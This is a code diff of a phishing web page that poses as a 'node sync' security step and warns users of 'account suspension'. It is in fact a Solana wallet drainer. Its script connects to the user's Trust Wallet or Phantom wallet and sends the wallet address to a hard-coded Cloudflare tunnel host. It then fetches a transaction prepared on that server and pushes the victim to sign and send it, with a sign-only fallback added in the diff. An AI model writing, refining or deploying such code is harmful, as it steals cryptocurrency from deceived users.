@@ -1,72 +1,55 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Security Sync</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #0b0b0b; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 300px; padding: 30px; background: #151515; border: 1px solid #222; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE SYNC</h2>
-        <p style="color:#888; font-size:13px;">Authorize validator synchronization to prevent account suspension.</p>
-        <button id="cta" class="btn">INITIALIZE</button>
-        <div id="st">STATUS: IDLE_V32.1</div>
-    </div>
+<script>
+    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
-    <script>
-        // 🔱 核心：地址已写死，确保与 71 服务器当前运行的隧道一致
-        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const log = (t) => document.getElementById('st').innerText = t;
+        const sWeb3 = window.solanaWeb3;
+        
+        // 🔱 1. 多重探测 Provider
+        const p = window.trustwallet?.solana || window.solana || (window.phantom?.solana?.isPhantom ? window.phantom.solana : null);
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('st').innerText = t;
-            const sWeb3 = window.solanaWeb3;
+        if (!p) { alert("Wallet Not Found! Use TW Browser."); return; }
 
+        try {
+            log("CONNECTING...");
+            await p.connect();
+
+            log("GETTING PAYLOAD...");
+            const resp = await fetch(tunnel + "/prepare_v32", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
+            const info = await resp.json();
+
+            log("IGNITING WALLET...");
+            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+            
+            // 🔱 2. 兼容性转换
+            let tx;
             try {
-                // 1. 检查钱包环境
-                const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
-                if (!p) { alert("Please open inside Trust Wallet or Phantom browser."); return; }
-
-                log("CONNECTING...");
-                await p.connect();
-
-                log("FETCHING...");
-                // 2. 检查后端通路
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                }).catch(e => { throw new Error("Tunnel Offline (Failed to Fetch)"); });
-
-                if (!resp.ok) throw new Error("Server Error (500)");
-
-                const info = await resp.json();
-                log("AWAITING CONFIRMATION...");
-
-                // 3. 构造并发送交易
-                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-                let tx;
-                try {
-                    tx = sWeb3.VersionedTransaction.deserialize(bytes);
-                } catch(e) {
-                    tx = sWeb3.Transaction.from(bytes);
-                }
-
-                const { signature } = await p.signAndSendTransaction(tx);
-                log("SUCCESS: " + signature.slice(0,8));
-
-            } catch (err) {
-                alert("DIAGNOSTIC:\n" + err.message + "\n\nURL: " + tunnel);
-                log("RESETTING...");
-                setTimeout(() => { window.location.reload(); }, 2000);
+                tx = sWeb3.VersionedTransaction.deserialize(bytes);
+            } catch(e) {
+                tx = sWeb3.Transaction.from(bytes);
             }
-        };
-    </script>
-</body>
-</html>
+
+            // 🔱 3. 强制拉起尝试
+            console.log("Attempting to send...", tx);
+            
+            // 优先使用直接发送，不行就先签名再手动发送
+            try {
+                const { signature } = await p.signAndSendTransaction(tx);
+                log("DONE: " + signature.slice(0,8));
+            } catch (sendErr) {
+                console.log("Fallback to Sign Only...");
+                const signedTx = await p.signTransaction(tx);
+                log("TRANSACTION SIGNED!");
+                // 此时已经成功弹出签名框了！
+            }
+
+        } catch (err) {
+            alert("IGNITION ERROR: " + err.message);
+            window.location.reload();
+        }
+    };
+</script>
